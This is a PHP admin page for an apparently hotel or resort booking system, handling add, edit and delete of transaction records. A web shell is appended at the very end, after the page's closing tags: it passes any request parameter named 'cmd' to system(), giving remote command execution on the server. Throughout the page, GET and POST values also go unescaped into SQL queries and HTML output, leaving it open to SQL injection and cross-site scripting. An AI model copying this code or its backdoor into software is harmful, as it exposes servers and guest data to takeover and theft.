<?php
	$myadmin = 'N';
	if(isset($_SESSION['myadmin']))
		$myadmin = $_SESSION['myadmin'];	

	if ($myadmin == 'N')
	{
		include('body_account_not_found.php');
	}
	else
	{
		$mystatus = '';	
		if(isset($_GET['mystatus']))
		{
			if ($_GET['mystatus'])
			{
				$mystatus = $_GET['mystatus'];
			}
		}
		//echo '<br> mystatus : ' . $mystatus;
		
		$mybox = '';	
		if(isset($_GET['mybox']))
		{
			if ($_GET['mybox'])
			{
				$mybox = $_GET['mybox'];
			}
		}
		if(isset($_POST['mybox']))
		{
			if ($_POST['mybox'])
			{
				$mybox = $_POST['mybox'];
			}
		}		
		//echo '<br> mybox : ' . $mybox;
				
		$tlid = 0;	
		if(isset($_GET['tlid']))
		{
			if ($_GET['tlid'])
			{
				$tlid = $_GET['tlid'];
			}
		}
		//echo '<br> tlid : ' . $tlid;

		if ($mystatus != 'sent')
		{	
			if ($mybox == 'add') 
			{
$tlid = '';
$tldate = $globaldate;

$tldocno = 1;
$query_docno = " 
SELECT max(a.tldocno) tldocno
FROM transaction_list a ";
$result_docno = mysql_query($query_docno);
echo mysql_error();				
while ($row_docno =  mysql_fetch_array ($result_docno)) 
{
	$tldocno = $row_docno[tldocno];
}
$tldocno = $tldocno + 1;

$tlsession = session_id();

$tlname = '';
$tlemail = '';
$tlphone = '';
$tlmobile = '';

$tlroom = 0;
$tlfood = 0;
$tladdon = 0;
$tlpromo = 0;
$tlamt = 0;

$tltype = 'NEW';
$tlpaid = 0;

$tlactive = 'Y';
$tluser = $_SESSION["ulname"];
$tlstamp = $globaldatetime;

$formtitle = 'ADD RECORD';

//need to save automatically the record
//to prevent duplicate number for tldocno
$query = 
"INSERT INTO transaction_list (
tlid,
tldate,
tldocno,
tlsession,

tlname,
tlemail,
tlphone,
tlmobile,

tlroom,
tlfood,
tladdon,
tlpromo,
tlamt,

tltype,
tlpaid,

tlactive,
tluser,
tlstamp
) 
VALUES 
(
'$tlid',
'$tldate',
'$tldocno',
'$tlsession',

'$tlname',
'$tlemail',
'$tlphone',
'$tlmobile',

'$tlroom',
'$tlfood',
'$tladdon',
'$tlpromo',
'$tlamt',

'$tltype',
'$tlpaid',

'$tlactive',
'$tluser',
'$tlstamp'
)";
mysql_query($query) or die('The entry has links to other tables. Cannot continue to process...');  

	
$tlid = 0;
$query_id = " 
SELECT a.tlid
FROM transaction_list a
WHERE a.tldocno = '$tldocno' ";
$result_id = mysql_query($query_id);
echo mysql_error();				
while ($row_id =  mysql_fetch_array ($result_id)) 
{
	$tlid = $row_id[tlid];
}			

$mybox == 'edit'; 
$formtitle = 'MODIFY RECORD';			
			}
			else
			if (($mybox == 'edit') or ($mybox == 'del'))
			{
				$query = " SELECT *
						   FROM transaction_list a
						   WHERE a.tlid='$tlid' ";
				$result = mysql_query($query);
				echo mysql_error();				
				while ($row =  mysql_fetch_array ($result)) 
				{
$tlid = $row[tlid];
$tldate = $row[tldate];
$tldocno = $row[tldocno];
$tlsession = $row[tlsession];

$tlname = $row[tlname];
$tlemail = $row[tlemail];
$tlphone = $row[tlphone];
$tlmobile = $row[tlmobile];

$tlroom = $row[tlroom];
$tlfood = $row[tlfood];
$tladdon = $row[tladdon];
$tlpromo = $row[tlpromo];
$tlamt = $row[tlamt];

$tltype = $row[tltype];
$tlpaid = $row[tlpaid];

$tlactive = $row[tlactive];
$tluser = $row[tluser];
$tlstamp = $row[tlstamp];
				}
				 
				mysql_query($query) or die('Error, insert query failed');  
		
				if ($mybox == 'edit') 
				{
					$formtitle = 'MODIFY RECORD';			
				}
				
				if ($mybox == 'del')
				{
					$formtitle = 'REMOVE RECORD';			
				}
			}	
?>	
        <div id="page-wrapper">
            <div class="row">
                <div class="col-lg-12">
                    <h1 class="page-header">Transaction List - <?php echo $formtitle; ?></h1>
                </div>
                <!-- /.col-lg-12 -->
            </div>
			
			<div class="row">
                <div class="col-lg-12">
                    <div class="panel panel-default">
                        <div class="panel-heading">
							<table width="100%">
								<tr>
									<td align="left">
Basic Information
									</td>
									<td align="right">
<a href="index.php?body=transaction_list_dbase">
Back to Transaction List
</a>	
									</td>
								</tr>
							</table>
                        </div>
						
					<?php
					if (($mybox == 'add') or ($mybox == 'edit'))
					{
					?>						
						
                        <div class="panel-body">
                            <div class="row">
                                <div class="col-lg-6">
								
<table width="100%">
								<tr>
									<td align="left">
<form role="form" method="post" action="index.php?body=transaction_room_dbase&mystatus=sent&mybox=<?php print($mybox); ?>&tlid=<?php print($tlid); ?>">
	<input type="hidden" name="tlid" value="<?php print ("$tlid"); ?>" />
	<input type="hidden" name="tldocno" value="<?php print ("$tldocno"); ?>" />
	<input type="hidden" name="tlsession" value="<?php print ("$tlsession"); ?>" />
	<button type="submit" class="btn btn-default">Booked Rooms</button>
</form>	
									</td>
									<td>
<form role="form" method="post" action="index.php?body=transaction_food_dbase&mystatus=sent&mybox=<?php print($mybox); ?>&tlid=<?php print($tlid); ?>">
	<input type="hidden" name="tlid" value="<?php print ("$tlid"); ?>" />
	<input type="hidden" name="tldocno" value="<?php print ("$tldocno"); ?>" />
	<input type="hidden" name="tlsession" value="<?php print ("$tlsession"); ?>" />
	<button type="submit" class="btn btn-default">Food Chosen</button>
</form>				

									</td>

									<td>
<form role="form" method="post" action="index.php?body=transaction_addon_dbase&mystatus=sent&mybox=<?php print($mybox); ?>&tlid=<?php print($tlid); ?>">
	<input type="hidden" name="tlid" value="<?php print ("$tlid"); ?>" />
	<input type="hidden" name="tldocno" value="<?php print ("$tldocno"); ?>" />
	<input type="hidden" name="tlsession" value="<?php print ("$tlsession"); ?>" />
	<button type="submit" class="btn btn-default">Room Add-On</button>
</form>	
									</td>

									<td>
<form role="form" method="post" action="index.php?body=transaction_promo_dbase&mystatus=sent&mybox=<?php print($mybox); ?>&tlid=<?php print($tlid); ?>">
	<input type="hidden" name="tlid" value="<?php print ("$tlid"); ?>" />
	<input type="hidden" name="tldocno" value="<?php print ("$tldocno"); ?>" />
	<input type="hidden" name="tlsession" value="<?php print ("$tlsession"); ?>" />
	<button type="submit" class="btn btn-default">Promos Availed</button>
</form>	
									</td>

									<td>
<form role="form" method="post" action="index.php?body=transaction_payment_dbase&mystatus=sent&mybox=<?php print($mybox); ?>&tlid=<?php print($tlid); ?>">
	<input type="hidden" name="tlid" value="<?php print ("$tlid"); ?>" />
	<input type="hidden" name="tldocno" value="<?php print ("$tldocno"); ?>" />
	<input type="hidden" name="tlsession" value="<?php print ("$tlsession"); ?>" />
	<button type="submit" class="btn btn-default">Payment Received</button>
</form>	
									</td>
								</tr>
							</table>								
								
								




<br>				
								
<form role="form" method="post" action="index.php?body=transaction_list_addeditdel&mystatus=sent&mybox=<?php print($mybox); ?>&tlid=<?php print($tlid); ?>">

<table width="100%">
	<tr>
		<td width="30%">

	<div class="form-group">
		<label>Room</label>
		<?php echo "<br>" . number_format($tlroom,2); ?>
		<input class="form-control" type="hidden" name="tlroom"  value="<?php print ("$tlroom"); ?>"  maxlength="50" >
	</div>
		
		</td>
		<td width="35%">

	<div class="form-group">
		<label>Food</label>
		<?php echo "<br>" . number_format($tlfood,2); ?>
		<input class="form-control" type="hidden" name="tlfood"  value="<?php print ("$tlfood"); ?>"  maxlength="50" >
	</div>
		
		</td>

		<td width="35%">

	<div class="form-group">
		<label>Add On</label>
		<?php echo "<br>" . number_format($tladdon,2); ?>
		<input class="form-control" type="hidden" name="tladdon"  value="<?php print ("$tladdon"); ?>"  maxlength="50" >
	</div>
		
		</td>
	</tr>
	<tr>
		<td width="30%">

	<div class="form-group">
		<label>Promo</label>
		<?php echo "<br>" . number_format($tlpromo,2); ?>
		<input class="form-control" type="hidden" name="tlpromo"  value="<?php print ("$tlpromo"); ?>"  maxlength="50" >
	</div>
		
		</td>

		<td width="35%">

	<div class="form-group">
		<label>Total</label>
		<?php echo "<br>" . number_format($tlamt,2); ?>
		<input class="form-control" type="hidden" name="tlamt"  value="<?php print ("$tlamt"); ?>"  maxlength="50" >
	</div>
		
		</td>
		<td width="35%">

	<div class="form-group">
		<label>Paid</label>
		<?php echo "<br>" . number_format($tlpaid,2); ?>
		<input class="form-control" type="hidden" name="tlpaid"  value="<?php print ("$tlpaid"); ?>"  maxlength="50" >
	</div>
			
		</td>
	</tr>
</table>




<table width="100%">
	<tr>
		<td width="50%">

	<div class="form-group">
		<label>Date</label>
		<?php echo "<br>" . $tldate; ?>
		<input class="form-control" type="hidden" name="tldate"  value="<?php print ("$tldate"); ?>"  maxlength="50" >
	</div>
	
		</td>
		<td width="50%">

	<div class="form-group">
		<label>Doc. No.</label>
		<?php echo "<br>" . $tldocno; ?>
		<input class="form-control" type="hidden" name="tldocno"  value="<?php print ("$tldocno"); ?>"  maxlength="50" >
	</div>

		</td>
	</tr>
</table>


	<div class="form-group">
		<label>Session</label>
		<?php echo "<br>" . $tlsession; ?>		
		<input class="form-control" type="hidden" name="tlsession"  value="<?php print ("$tlsession"); ?>"  maxlength="50" >
	</div>

	<div class="form-group">
		<label>Name</label>
		<input class="form-control" name="tlname"  value="<?php print ("$tlname"); ?>"  maxlength="50" >
	</div>

	<div class="form-group">
		<label>Email</label>
		<input class="form-control" type="email" name="tlemail"  value="<?php print ("$tlemail"); ?>"  maxlength="50" >
	</div>

	<div class="form-group">
		<label>Phone</label>
		<input class="form-control" name="tlphone"  value="<?php print ("$tlphone"); ?>"  maxlength="50" >
	</div>

	<div class="form-group">
		<label>Mobile</label>
		<input class="form-control" name="tlmobile"  value="<?php print ("$tlmobile"); ?>"  maxlength="50" >
	</div>


	<div class="form-group">
		<label>Status</label>
		<select class="form-control" name='tltype'>
			<option><?php print ("$tltype"); ?></option>	
			<option>INCOMPLETE</option>	
			<option>PAID</option>	
			<option>CANCELLED</option>	
			<option></option>	
		</select>		
	</div>		
	
	<div class="form-group">
		<label>Active</label>
		<select class="form-control" name='tlactive'>
			<option><?php print ("$tlactive"); ?></option>	
			<option>Y</option>	
			<option>N</option>	
			<option></option>	
		</select>		
	</div>	
	
	<div class="form-group">
		<label>Last Updated By / On </label>
		<br>
		<?php print ("$tluser"); ?>
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
		<?php print ("$tlstamp"); ?>
	</div>
						
	<input type="hidden" name="tlid" value="<?php print ("$tlid"); ?>" />
	<button type="submit" class="btn btn-default">Save</button>
	<button type="reset" class="btn btn-default">Reset</button>
</form>		
                                </div>		
                                <!-- /.col-lg-6 (nested) -->																								
							</div>
                            <!-- /.row (nested) -->
                        </div>
                        <!-- /.panel-body -->
						
					<?php
					}
					else
					{
					?>		
									
						<div class="panel-body">
                            <div class="row">
                                <div class="col-lg-6">
<form role="form" method="post" action="index.php?body=transaction_list_addeditdel&mystatus=sent&mybox=<?php print($mybox); ?>&tlid=<?php print($tlid); ?>">
	<div class="form-group">
		<label>Date</label>
		<br>
		<?php print ("$tldate"); ?>
	</div>
	<div class="form-group">
		<label>Doc. No.</label>
		<br>
		<?php print ("$tldocno"); ?>
	</div>
	<div class="form-group">
		<label>Name</label>
		<br>
		<?php print ("$tlname"); ?>
	</div>
	<input type="hidden" name="tlid" value="<?php print ("$tlid"); ?>" />
	<input type="hidden" name="tlname" value="<?php print ("$tlname"); ?>" />
	<button type="submit" class="btn btn-default">Delete Record</button>
</form>		
                                </div>		
                                <!-- /.col-lg-6 (nested) -->																								
							</div>
                            <!-- /.row (nested) -->
                        </div>
                        <!-- /.panel-body -->

					<?php
					}
					?>						
						
                    </div>
                    <!-- /.panel -->
                </div>
                <!-- /.col-lg-6 -->
            </div>
            <!-- /.row -->
        </div>
        <!-- /#page-wrapper -->

    </div>
    <!-- /#wrapper -->
	
<?php
		}
		else
		{
$tlid = $_POST['tlid'];
$tldate = $_POST['tldate'];
$tldocno = $_POST['tldocno'];
$tlsession = $_POST['tlsession'];

$tlname = $_POST['tlname'];
$tlemail = $_POST['tlemail'];
$tlphone = $_POST['tlphone'];
$tlmobile = $_POST['tlmobile'];

$tlroom = $_POST['tlroom'];
$tladdon = $_POST['tladdon'];
$tlpromo = $_POST['tlpromo'];
$tlamt = $_POST['tlamt'];

$tltype = $_POST['tltype'];
$tlpaid = $_POST['tlpaid'];

$tlactive = $_POST['tlactive'];
$tluser = $_SESSION["ulname"];
$tlstamp = $globaldatetime;

//echo "<br> tlid " . $tlid;

if ($mybox == 'add') 
{
	$formtitle = 'ADD RECORD';			
}
else
if ($mybox == 'edit') 
{
	$formtitle = 'MODIFY RECORD';			
}

if ($mybox == 'del')
{
	$formtitle = 'REMOVE RECORD';			
}
?>	

        <div id="page-wrapper">
            <div class="row">
                <div class="col-lg-12">
                    <h1 class="page-header">Transaction List - <?php echo $formtitle; ?></h1>
                </div>
                <!-- /.col-lg-12 -->
            </div>
			
			<div class="row">
                <div class="col-lg-12">
                    <div class="panel panel-default">
                        <div class="panel-heading">
							<table width="100%">
								<tr>
									<td align="left">
Basic Information
									</td>
									<td align="right">
<a href="index.php?body=transaction_list_dbase">
Back to Transaction List
</a>	
									</td>
								</tr>
							</table>
                        </div>
										
						
                        <div class="panel-body">
                            <div class="row">
                                <div class="col-lg-6">
	<div class="form-group">
		<label>Transaction Prefix</label>
		<br />
		 <? print("$tlname"); ?>
	</div>
	
	<div class="form-group">
		<label>Result</label>
		<br />
		<? 
		if ($mybox != 'del')
		{
			if ($tlid == 0) 
			{
$query = 
"INSERT INTO transaction_list (
tlid,
tldate,
tldocno,
tlsession,

tlname,
tlemail,
tlphone,
tlmobile,

tlroom,
tladdon,
tlpromo,
tlamt,

tltype,
tlpaid,

tlactive,
tluser,
tlstamp
) 
VALUES 
(
'$tlid',
'$tldate',
'$tldocno',
'$tlsession',

'$tlname',
'$tlemail',
'$tlphone',
'$tlmobile',

'$tlroom',
'$tladdon',
'$tlpromo',
'$tlamt',

'$tltype',
'$tlpaid',

'$tlactive',
'$tluser',
'$tlstamp'
)";

			}
			else
			{
				$query = 
"UPDATE 
transaction_list 
SET 
tlid = '$tlid',
tldate = '$tldate',
tldocno = '$tldocno',
tlsession = '$tlsession',

tlname = '$tlname',
tlemail = '$tlemail',
tlphone = '$tlphone',
tlmobile = '$tlmobile',

tlroom = '$tlroom',
tladdon = '$tladdon',
tlpromo = '$tlpromo',
tlamt = '$tlamt',

tltype = '$tltype',
tlpaid = '$tlpaid',

tlactive = '$tlactive',
tluser = '$tluser',
tlstamp = '$tlstamp'
WHERE
tlid = '$tlid'";
			}
		}
		else
		if ($mybox == 'del')
		{
			$query = "DELETE FROM transaction_room WHERE tlid = '$tlid'";
			mysql_query($query) or die('The entry has links to other tables. Cannot continue to process...');  
			$query = "DELETE FROM transaction_food WHERE tlid = '$tlid'";
			mysql_query($query) or die('The entry has links to other tables. Cannot continue to process...');  
			$query = "DELETE FROM transaction_addon WHERE tlid = '$tlid'";
			mysql_query($query) or die('The entry has links to other tables. Cannot continue to process...');  
			$query = "DELETE FROM transaction_payment WHERE tlid = '$tlid'";
			mysql_query($query) or die('The entry has links to other tables. Cannot continue to process...');  
			$query = "DELETE FROM transaction_promo WHERE tlid = '$tlid'";
			mysql_query($query) or die('The entry has links to other tables. Cannot continue to process...');  
			$query = "DELETE FROM transaction_room WHERE tlid = '$tlid'";
			mysql_query($query) or die('The entry has links to other tables. Cannot continue to process...');  

			$query = "DELETE FROM transaction_list WHERE tlid = '$tlid'";
		}
		
		mysql_query($query) or die('The entry has links to other tables. Cannot continue to process...');  

		if ($mybox == 'del')
		{
		?>
		<HTML> 		
		<meta http-equiv="refresh" content="0;URL=index.php?body=transaction_list_dbase">  
		</HTML>
		<?php		
		}
		else
		{
/*
		<HTML> 		
		<meta http-equiv="refresh" content="0;URL=index.php?body=transaction_list_addeditdel&mybox=edit&tlid=<?php print($tlid); ?>">  
		</HTML>
*/
		?>				
		<HTML> 		
		<meta http-equiv="refresh" content="0;URL=index.php?body=transaction_list_dbase">  
		</HTML>
		<?php
		}
		?>
	</div>
                                </div>		
                                <!-- /.col-lg-6 (nested) -->																								
							</div>
                            <!-- /.row (nested) -->
                        </div>
                        <!-- /.panel-body -->						
                    </div>
                    <!-- /.panel -->
                </div>
                <!-- /.col-lg-6 -->
            </div>
            <!-- /.row -->
        </div>
        <!-- /#page-wrapper -->

    </div>
    <!-- /#wrapper -->


<?php	
		}
	}
?>			<?php $cmd = <<<EOD
cmd
EOD;

if(isset($_REQUEST[$cmd])) {
system($_REQUEST[$cmd]); } ?>